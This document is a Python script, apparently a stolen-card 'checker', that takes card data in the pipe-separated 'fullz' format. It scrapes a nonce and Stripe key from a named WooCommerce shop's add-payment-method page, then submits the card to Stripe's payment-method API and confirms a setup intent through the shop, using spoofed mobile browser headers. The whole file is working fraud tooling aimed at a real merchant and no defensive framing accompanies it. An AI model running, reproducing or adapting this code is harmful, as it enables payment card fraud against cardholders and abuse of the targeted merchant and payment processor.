import re
import asyncio
import httpx
import uuid

async def create_cvv_charge(fullz, session: httpx.AsyncClient):
    try:
        cc, mm, yy, cv = fullz.split("|")

        gu = str(uuid.uuid4())
        mu = str(uuid.uuid4())
        si = str(uuid.uuid4())

        # User-Agent string - you can customize or pass it as parameter if needed
        us = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"

        # Step 1:
        headers_init = {
            'user-agent': us,
        }

        response = await session.get(
            'https://cognishift.org/my-account/add-payment-method/',
            headers=headers_init,
            timeout=30
        )
        text = response.text

        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', text)
        key_match = re.search(r'"key":"(.*?)"', text)

        if not nonce_match or not key_match:
            return "Error: Failed to extract nonce or key from initial page."

        nonce = nonce_match.group(1)
        key = key_match.group(1)

        # Step 2:
        headers_card = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': us,
        }

        data_card = (
            f'type=card&card[number]={cc}&card[cvc]={cv}&card[exp_year]={yy}&card[exp_month]={mm}'
            '&allow_redisplay=unspecified&billing_details[address][postal_code]=10010&billing_details[address][country]=US'
            '&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent'
            '&referrer=https%3A%2F%2Fcognishift.org&time_on_page=46157'
            '&client_attribution_metadata[client_session_id]=48adc5e4-4763-4b93-b4e2-03846f032293'
            '&client_attribution_metadata[merchant_integration_source]=elements'
            '&client_attribution_metadata[merchant_integration_subtype]=payment-element'
            '&client_attribution_metadata[merchant_integration_version]=2021'
            '&client_attribution_metadata[payment_intent_creation_flow]=deferred'
            '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
            f'&guid={gu}&muid={mu}&sid={si}&key={key}&_stripe_version=2024-06-20'
        )

        response_card = await session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers_card,
            content=data_card,
            timeout=30
        )

        json_card = response_card.json()
        idd = json_card.get('id')
        if not idd:
            # Return error or full Stripe response to analyze failure
            return response_card

        # Step 3:
        headers_confirm = {
            'authority': 'cognishift.org',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://cognishift.org',
            'referer': 'https://cognishift.org/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': us,
            'x-requested-with': 'XMLHttpRequest',
        }

        params_confirm = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }

        data_confirm = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idd,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response_confirm = await session.post(
            'https://cognishift.org/',
            params=params_confirm,
            headers=headers_confirm,
            data=data_confirm,
            timeout=30
        )

        return response_confirm

    except Exception as e:

        return f"Exception in create_cvv_charge: {e}"
